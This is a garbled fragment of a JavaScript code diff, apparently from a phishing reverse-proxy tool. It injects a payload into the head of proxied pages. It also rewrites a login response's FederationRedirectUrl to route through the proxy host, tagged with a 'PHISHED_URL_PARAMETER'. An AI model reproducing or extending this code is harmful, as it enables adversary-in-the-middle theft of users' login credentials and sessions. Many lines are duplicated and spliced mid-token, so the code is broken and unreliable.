     ]);
 }
 
+function updateTagBuffer.byteLength)
+            ]);
+        }
+    }
+    return Buffer.concat([
+        Buffer.from(`<head>${payload}</head>`),
+        decompressedResponseBody
+    ]);
+}
+
 function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
+FederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     const decompressedResponseBodyString = decompressedResponseBody.toString();
+    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
+       const decompressedResponseBodyString = decompressedResponseBody.toString();
     const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
     const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;
 
+    const proxyRequestURL = new URL(`https://${proxyHost const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;
+
     const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
+    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationname}${PROXY_PATHNAMES.mutation}`);
     proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
+    
+    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
+    return Buffer.from(JSON.stringify(decompRedirectUrl));
     
     decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
     return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
